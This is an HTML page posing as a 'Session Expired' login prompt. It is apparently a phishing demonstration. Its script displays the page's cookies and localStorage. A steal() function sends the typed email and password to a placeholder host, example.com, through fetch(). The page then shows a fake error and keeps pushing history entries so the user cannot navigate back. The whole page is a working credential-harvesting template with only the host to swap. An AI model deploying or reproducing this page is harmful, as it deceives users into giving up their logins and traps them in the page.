<!DOCTYPE html>
<html>
<body style="font-family:sans-serif">

<h2>Session Expired</h2>
<p>Please log in again to continue</p>

<input id="user" placeholder="Email"><br><br>
<input id="pass" type="password" placeholder="Password"><br><br>

<button onclick="steal()">Login</button>

<pre id="info"></pre>

<script>
// Show environment info
document.getElementById("info").innerText =
  "Origin: " + location.origin + "\n" +
  "Cookies: " + document.cookie + "\n" +
  "LocalStorage: " + JSON.stringify(localStorage);

// Fake credential capture
function steal() {
  let u = document.getElementById("user").value;
  let p = document.getElementById("pass").value;

  document.body.innerHTML = "<h3>Logging in...</h3>";

  // Simulate exfiltration
  fetch("https://example.com/log?u=" + encodeURIComponent(u) + "&p=" + encodeURIComponent(p));

  setTimeout(() => {
    document.body.innerHTML = "<h3>Session expired. Try again later.</h3>";
  }, 1000);
}

// Optional: trap user in page
setInterval(() => {
  history.pushState({}, "", "#");
}, 500);

</script>

</body>
</html>
